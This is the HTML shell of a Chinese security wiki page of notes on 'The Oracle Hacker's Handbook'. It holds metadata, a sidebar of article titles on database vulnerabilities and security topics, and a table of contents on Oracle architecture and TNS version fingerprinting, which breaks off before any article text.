<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
    <title>The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 上篇 | Tahir&#39;s Wiki</title>
    
    
        <meta name="keywords" content="Oracle Database">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="The  Oracle Hacker’s Handbook: Hacking and Defending Oracle by David  Litchfield John Wiley &amp; Sons 探索黑帽黑客用来入侵和破坏 Oracle 的每一种技术和工具，这份深入指南向您展示了如何找到数据库中的弱点，以便更好地保护它们。 [TOC] Oracle RDBMS概述进程​        在">
<meta property="og:type" content="article">
<meta property="og:title" content="The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 上篇">
<meta property="og:url" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/index.html">
<meta property="og:site_name" content="Tahir&#39;s Wiki">
<meta property="og:description" content="The  Oracle Hacker’s Handbook: Hacking and Defending Oracle by David  Litchfield John Wiley &amp; Sons 探索黑帽黑客用来入侵和破坏 Oracle 的每一种技术和工具，这份深入指南向您展示了如何找到数据库中的弱点，以便更好地保护它们。 [TOC] Oracle RDBMS概述进程​        在">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/1.png">
<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/2.png">
<meta property="og:image" content="http://example.com/3.PNG">
<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/4.png">
<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/5.png">
<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/6.png">
<meta property="article:published_time" content="2021-07-12T08:06:40.000Z">
<meta property="article:modified_time" content="2021-07-14T08:17:18.558Z">
<meta property="article:author" content="Tahir">
<meta property="article:tag" content="Oracle Database">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/1.png">
    

    
        <link rel="alternate" href="/atom.xml" title="Tahir&#39;s Wiki" type="application/atom+xml">
    

    
        <link rel="icon" href="/favicon.ico">
    

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/libs/open-sans/styles.css">

    
<link rel="stylesheet" href="/libs/source-code-pro/styles.css">


    
<link rel="stylesheet" href="/css/style.css">

    
<script src="/libs/jquery/2.1.3/jquery.min.js"></script>

    
<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>

    
    
        
<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">

    
    
        
<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">

    
    
    
    


    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <div id="container">
        <header id="header">
    <div id="header-main" class="header-inner">
        <div class="outer">
            <a href="/" id="logo">
                <i class="logo"></i>
                <span class="site-title">Tahir&#39;s Wiki</span>
            </a>
            <nav id="main-nav">
                
                    <a class="main-nav-link" href="/">首页</a>
                
                    <a class="main-nav-link" href="/archives">归档</a>
                
                    <a class="main-nav-link" href="/categories">分类</a>
                
                    <a class="main-nav-link" href="/tags">标签</a>
                
                    <a class="main-nav-link" href="/about">关于</a>
                
            </nav>
            
            <div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something...">
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div>
        </div>
    </div>
    <div id="main-nav-mobile" class="header-sub header-inner">
        <table class="menu outer">
            <tr>
                
                    <td><a class="main-nav-link" href="/">首页</a></td>
                
                    <td><a class="main-nav-link" href="/archives">归档</a></td>
                
                    <td><a class="main-nav-link" href="/categories">分类</a></td>
                
                    <td><a class="main-nav-link" href="/tags">标签</a></td>
                
                    <td><a class="main-nav-link" href="/about">关于</a></td>
                
                <td>
                    
    <div class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
    </div>

                </td>
            </tr>
        </table>
    </div>
</header>

        <div class="outer">
            
            
                <aside id="sidebar">
   
        
    <div class="widget-wrap" id="categories">
        <h3 class="widget-title">
            <span>categories</span>
            &nbsp;
            <a id="allExpand" href="#">
                <i class="fa fa-angle-double-down fa-2x"></i>
            </a>
        </h3>
        
        
        
         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            1. 漏洞相关
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            MSSQL
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2020-0618_SQL Server Reporting Services远程代码执行漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">BID-23649_SQL Server链接爬网命令执行漏洞</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            OpenSSL
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/">CVE-2014-0224_OpenSSL中间人漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/">CVE-2014-0160_OpenSSL心脏滴血漏洞</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Redis
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">Redis未授权访问漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Redis主从复制代码执行漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">CVE-2013-7458_Redis redis-cli信息泄露漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2015-8080_Redis getnum整数溢出漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2016-8339_Redis缓冲区溢出漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/">CVE-2016-10517_Redis跨协议漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-15047_Redis数组索引越界漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2018-11218_Redis Lua缓冲区溢出漏洞</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory open">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder-open"></i>
                            &nbsp;
                            2. 数据库安全
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory open">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder-open"></i>
                            &nbsp;
                            Oracle Database
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/">Oracle Database简单概述</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/">Oracle Database PL/SQL注入漏洞原理</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">Oracle Database 11g Wrap加密解密分析</a></li>  <li class="file active"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/">The Oracle Hacker's Handbook: Hacking and Defending Oracle 上篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/">The Oracle Hacker's Handbook: Hacking and Defending Oracle 下篇</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            SQL Server
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/">SQL Server数据库攻防详解上篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/">SQL Server数据库攻防详解下篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">SQL Server数据库安全加固</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            3. 应急响应
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Linux应急响应
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Linux应急响应</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Windows应急响应
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Windows应急响应</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            4. 内网安全攻防
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            0-内网攻防基础
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/">PowerShell基础</a></li>  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/">部署域环境</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            1-内网信息搜集
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">主机信息搜集</a></li>  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">域信息搜集</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            5. 高级威胁猎捕
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Cobalt Strike
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/">0-Cobalt Strike零基础</a></li>  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/">1-Cobalt Strike基础上篇</a></li>  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/">1-Cobalt Strike基础中篇</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Defense Evasion
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            进程注入
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/"></a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            6. 威胁情报
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            APT情报
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/6.%20%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/APT%E6%83%85%E6%8A%A5/%E7%9F%A5%E5%90%8DAPT%E7%BB%84%E7%BB%87%E6%A6%82%E8%BF%B0/">知名APT组织概述</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            7. 学习资源
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/7.%20%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/">学习资源</a></li>  </ul> 
                    </li> 
                     <li class="file"><a href="/wiki/hello-world/">Hello World</a></li>  <li class="file"><a href="/wiki/Christina-heart-line/">Christina heart line</a></li>  </ul> 
    </div>
    <script>
        $(document).ready(function() {
            var iconFolderOpenClass  = 'fa-folder-open';
            var iconFolderCloseClass = 'fa-folder';
            var iconAllExpandClass = 'fa-angle-double-down';
            var iconAllPackClass = 'fa-angle-double-up';
            // Handle directory-tree expansion:
            // 左键单独展开目录
            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
                event.preventDefault();

                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconFolderOpenClass);
                var subtree = $(this).siblings('ul');
                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
                if (expanded) {
                    if (typeof subtree != 'undefined') {
                        subtree.slideUp({ duration: 100 });
                    }
                    icon.addClass(iconFolderCloseClass);
                } else {
                    if (typeof subtree != 'undefined') {
                        subtree.slideDown({ duration: 100 });
                    }
                    icon.addClass(iconFolderOpenClass);
                }
            });
            // 右键展开下属所有目录
            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
                event.preventDefault();
                
                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconFolderOpenClass);
                var listNode = $(this).siblings('ul');
                var subtrees = $.merge(listNode.find('li ul'), listNode);
                var icons = $.merge(listNode.find('.fa'), icon);
                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
                if(expanded) {
                    subtrees.slideUp({ duration: 100 });
                    icons.addClass(iconFolderCloseClass);
                } else {
                    subtrees.slideDown({ duration: 100 });
                    icons.addClass(iconFolderOpenClass);
                }
            })
            // 展开关闭所有目录按钮
            $(document).on('click', '#allExpand', function (event) {
                event.preventDefault();
                
                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconAllExpandClass);
                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
                if(expanded) {
                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
                    $('#categories li ul').slideDown({ duration: 100 });
                    icon.addClass(iconAllPackClass);
                } else {
                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
                    $('#categories li ul').slideUp({ duration: 100 });
                    icon.addClass(iconAllExpandClass);
                }
            });  
        });
    </script>

    
    <div id="toTop" class="fa fa-angle-up"></div>
</aside>
            
            <section id="main"><article id="post-2. 数据库安全/Oracle Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-上篇" class="article article-type-post" itemscope itemprop="blogPost">
    <div class="article-inner">
        
        
            <header class="article-header">
                
                    <div class="article-meta">
                        
    <div class="article-category">
    	<i class="fa fa-folder"></i>
        <a class="article-category-link" href="/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/">2. 数据库安全</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/">Oracle Database</a>
    </div>

                        
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link-link" href="/tags/Oracle-Database/" rel="tag">Oracle Database</a>
    </div>

                        
    <div class="article-date">
        <i class="fa fa-calendar"></i>
        <a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/">
            <time datetime="2021-07-12T08:06:40.000Z" itemprop="datePublished">2021-07-12</time>
        </a>
    </div>


                        
                            <i class="fa fa-bar-chart"></i>
                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
                        
                        
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/raw/writing/source/_posts/2. 数据库安全/Oracle Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-上篇.md"> Source </a>
                            </div>
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/edit/writing/source/_posts/2. 数据库安全/Oracle Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-上篇.md"> Edit </a>
                            </div>
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/commits/writing/source/_posts/2. 数据库安全/Oracle Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-上篇.md"> History </a>
                            </div>
                        
                    </div>
                
                
    
        <h1 class="article-title" itemprop="name">
            The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 上篇
        </h1>
    

            </header>
        
        
        <div class="article-entry" itemprop="articleBody">
        
        
            
                <div id="toc" class="toc-article">
                <strong class="toc-title">Catalogue</strong>
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-RDBMS%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">Oracle RDBMS概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.2.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.</span> <span class="toc-text">网络结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.4.</span> <span class="toc-text">数据库对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%92%8C%E8%A7%92%E8%89%B2"><span class="toc-number">1.5.</span> <span class="toc-text">用户和角色</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">特权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E8%A1%A5%E4%B8%81"><span class="toc-number">1.7.</span> <span class="toc-text">Oracle 补丁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">Oracle网络体系结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TNS%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">TNS协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TNS%E5%8D%8F%E8%AE%AE%E5%A4%B4%E9%83%A8"><span class="toc-number">2.1.1.</span> <span class="toc-text">TNS协议头部</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TNS%E5%8D%8F%E8%AE%AE%E5%8C%85%E4%BD%93"><span class="toc-number">2.1.2.</span> <span class="toc-text">TNS协议包体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Oracle%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">获取Oracle版本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%BE%A6%E5%90%AC%E5%99%A8%E7%89%88%E6%9C%AC%E5%92%8C%E7%8A%B6%E6%80%81%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.1.</span> <span class="toc-text">利用侦听器版本和状态命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8TNS%E5%8D%8F%E8%AE%AE%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.2.</span> <span class="toc-text">利用TNS协议版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XML%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.3.</span> <span class="toc-text">利用XML数据库版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8TNS%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.4.</span> <span class="toc-text">利用TNS报错信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8TNS%E7%9A%84TTC%E5%8A%9F%E8%83%BD"><span 